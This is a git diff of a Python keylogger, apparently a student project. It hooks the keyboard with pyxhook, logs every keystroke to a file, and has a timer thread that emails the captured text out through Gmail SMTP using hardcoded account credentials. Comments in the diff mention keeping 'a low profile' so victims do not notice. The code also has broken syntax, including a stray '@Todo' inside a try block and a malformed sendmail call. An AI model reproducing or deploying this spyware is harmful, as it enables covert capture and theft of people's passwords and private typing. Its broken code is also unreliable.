@@ -17,80 +17,109 @@ import threading
 import smtplib
 
 running = True
-str = ""
+string = ""
 
-#Email Logs
+# Email Logs
 class TimerClass(threading.Thread):
+
     def __init__(self):
         threading.Thread.__init__(self)
         self.event = threading.Event()
+
     def run(self):
-        while not self.event.is_set():
-            with open("test.txt", 'r') as file:
-                data = file.read()
-            if len(data)>100:
-                SERVER = "smtp.gmail.com" #Specify Server Here
-                PORT = 587 #Specify Port Here
-                USER="ritfakelogger@gmail.com"#Specify Username Here 
-                PASS="fakekeylogg"#Specify Password Here
-                FROM = USER#From address is taken from username
-                # Change this email to receive email address 
-                //TO = ["bm7514@g.rit.edu"] #Specify to address.Use comma if more than one to address is needed.
-                SUBJECT = "Keylogger data:"
+        global running
+        while not self.event.is_set() and running is False:
+            with open("test.txt", 'r') as datafile:
+                data = datafile.read()
+
+                # Initialize mail server for data transport
+                SERVER = "smtp.gmail.com"
+                PORT = 587
+                USER= "ritfakelogger@gmail.com"
+                PASS= "fakekeylogg"
+                FROM = USER
+                TO = ["dxt9140@g.rit.edu"]
+                SUBJECT = "Keylogger Data"
                 MESSAGE = data
+
                 try:
+                    # Connect to the server and send the message
                     server = smtplib.SMTP()
                     server.connect(SERVER,PORT)
                     server.starttls()
                     server.login(USER,PASS)
-                    server.sendmail(FROM, TO, MESSAGE)
+                    server.sendmail(FROM, TO, SUBJECT, MESSAGE)
                     server.quit()
-                    print("mail sent\n")
-                    with open("test.txt", 'w') as file:
-                        print("file reset\n")
-                        file.write("")
+                    with open("test.txt", 'w') as clear_file:
+                        clear_file.write("")
+    
+                """
+                I don't think we should print things to the console. We want
+                a low profile. Remove?
+                """
+                @Todo
                 except Exception as e:
                     print(e)
+
+            # Why wait?
             self.event.wait(1)
+
 
 def keyDownEvent( event ):
     global running
-    global str
-    #if user press esc program terminates
-    # will not be in final version
-    if event.Ascii == 27:
-        print("ESC")
-        running = False
-        return
+    global string
+
     if event.Ascii == 8:
-        str+="<BackSpace>"
-    else:
-        str+=chr(event.Ascii)
-    if event.Ascii == 32 or event.Ascii == 13 or event.Ascii == 8 or event.Ascii == 9:
-        # Spacebar indicates to end the program
+        string += "<BackSpace>"
+
+    # Only write printable characters
+    elif event.Ascii >= 32:
+        string += chr(event.Ascii)
+
+    # Esc ends the program
+    if event.Ascii == 27:
         file = open("test.txt", 'a')
-        file.write(str)
+        file.write(string)
         file.close()
-        str = ""
+        string = ""
+        running = False
+
 
 def main():
     global running
+
+    # Clear the data file. Can be removed later once I actually want to
+    # receive emails.
+    test_file = open("test.txt", "w")
+    test_file.write("")
+    test_file.close()
+
     running = True
-    # create PyxHook object
+
+    # Create PyxHook object
     keyboard_hook = pyxhook.HookManager()
+
     # keyDownEvent function is called when keydown is detected
     keyboard_hook.KeyDown = keyDownEvent
-    # hook the keyboad to listen
+
+    # hook the keyboard to listen
     keyboard_hook.HookKeyboard()
-    # make it use thread 
+
+    # Begin the keyboard hook thread
     keyboard_hook.start()
+
+    """
+    I disabled the actual thread for testing purposes. It's annoying to
+    receive a bunch of emails when I can just read the test.txt file.
+    """
     # create timeClass object
-    mail=TimerClass()
+    # mail = TimerClass()
     # start listening and sending mail
-    mail.start()
-    # keep running 
+    # mail.start()
+
     while running:
         time.sleep(0.1)
+
     # close thread
     keyboard_hook.cancel()
 
